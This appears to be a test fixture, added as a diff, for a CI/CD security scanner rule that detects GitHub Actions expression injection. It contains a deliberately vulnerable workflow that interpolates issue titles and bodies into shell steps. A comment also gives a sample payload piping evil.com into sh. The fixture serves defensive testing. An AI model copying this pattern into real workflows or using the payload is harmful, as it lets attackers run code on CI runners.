@@ -1,0 +1,24 @@
+# Smoke-test fixture: CI/CD rule pack — Rule 5 (expression injection)
+#
+# `run:` step interpolates `${{ github.event.issue.title }}` directly into a
+# shell context. The title is attacker-controlled; an attacker who opens an
+# issue with the title `"; curl evil.com | sh; "` lands arbitrary shell
+# execution on the runner.
+#
+# Expected: 1 injection finding on the echo step.
+
+name: issue-triage
+on:
+  issues:
+    types: [opened]
+
+jobs:
+  triage:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Log title
+        run: |
+          echo "New issue: ${{ github.event.issue.title }}"
+
+      - name: Process body
+        run: echo "${{ github.event.issue.body }}" > /tmp/body.txt
